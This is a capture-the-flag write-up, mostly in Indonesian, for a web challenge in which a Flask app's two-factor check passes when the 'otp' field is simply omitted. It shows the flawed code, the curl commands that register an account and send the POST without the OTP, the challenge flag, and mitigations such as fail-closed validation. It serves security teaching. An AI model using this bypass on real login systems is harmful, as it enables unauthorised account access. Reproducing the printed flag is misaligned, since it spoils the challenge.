# Writeup: IntroToBurp (Challenge ID: 419)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Authentication Logic Flaw & Parameter Tampering
- **Difficulty:** Easy
- **Author:** Nana Ama Atombo-Sackey & Sabine Gisagara
- **Event:** picoCTF 2024
- **Points:** 100
- **Flag:** `academy{#0TP_Bypvss_SuCc3$S_4d564d34}`

---

## Problem Statement & Scope
Disediakan sebuah aplikasi web portal dengan sistem autentikasi dua faktor (*Two-Factor Authentication / 2FA*). Pengguna diminta melakukan registrasi akun baru, kemudian melewati tahap verifikasi OTP (One-Time Password) tanpa mengetahui kode OTP yang valid.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Cacat Logika Pengondisian Parameter (Missing Parameter Handling):**
   Pada implementasi backend server (Flask/Python), alur validasi OTP ditulis dengan asumsi implisit bahwa parameter formulir `otp` selalu dikirimkan oleh klien:
   ```python
   if 'otp' in request.form:
       if request.form['otp'] == secret_otp:
           return render_template('dashboard.html', flag=FLAG)
       else:
           return "Invalid OTP"
   else:
       # Fallback tidak menangani pengecualian melainkan langsung meloloskan alur eksekusi
       return render_template('dashboard.html', flag=FLAG)
   ```
2. **Ketiadaan Validasi Skema Ketat (Schema Validation Absence):** Server tidak memberlakukan validasi bahwa parameter wajib (*mandatory fields*) harus ada dan tidak kosong sebelum memproses status otentikasi.
3. **Pemanfaatan HTTP Intercept Proxy (Burp Suite / Skrip Custom):** Pengguna dapat mencegat request HTTP POST ke `/dashboard` dan menghapus badan parameter `otp` sepenuhnya sebelum dikirimkan ke server.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. Akses halaman registrasi pada instance target:
   ```bash
   curl -s http://chatelaine.cylabacademy.net:22296/
   ```
2. Lakukan registrasi akun baru dengan mengisi field yang diperlukan (`full_name`, `username`, `phone_number`, `city`, `password`):
   ```bash
   curl -s -c cookies.txt -d "csrf_token=<TOKEN>&full_name=Audit&username=auditor&phone_number=12345&city=Tech&password=Pass" http://chatelaine.cylabacademy.net:22296/
   ```
3. Browser diarahkan ke antarmuka 2FA pada rute `/dashboard`:
   ```html
   <h2>2fa authentication</h2>
   <form method="POST">
       <input type="text" name="otp" placeholder="Enter OTP">
       <button type="submit">Submit</button>
   </form>
   ```
4. Kirimkan permintaan POST ke `/dashboard` dengan menghapus parameter `otp` (mengirimkan body kosong atau payload dummy tanpa key `otp`):
   ```bash
   curl -s -b cookies.txt -d "bypass=true" http://chatelaine.cylabacademy.net:22296/dashboard
   ```
5. Server mengembalikan respon sukses bypass:
   ```text
   Welcome, auditor you sucessfully bypassed the OTP request. 
   Your Flag: academy{#0TP_Bypvss_SuCc3$S_4d564d34}
   ```

---

## Flag & Verifikasi
- **Flag:** `academy{#0TP_Bypvss_SuCc3$S_4d564d34}`
- **Verifikasi:** POST `/api/submissions/` mengembalikan respons `{"correct": true}` (HTTP Status 201).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Validasi Skema Input Ketat (Strict Input Validation):** Pastikan semua endpoint backend memvalidasi keberadaan seluruh field wajib sebelum melanjutkan logika bisnis. Jika field wajib tidak ditemukan, kembalikan HTTP `400 Bad Request` segera.
- **Fail-Closed Design Principle:** Terapkan prinsip perancangan *fail-closed* di mana jika suatu kondisi tidak terpenuhi atau parameter tidak lengkap, akses harus ditolak secara default (*deny by default*).
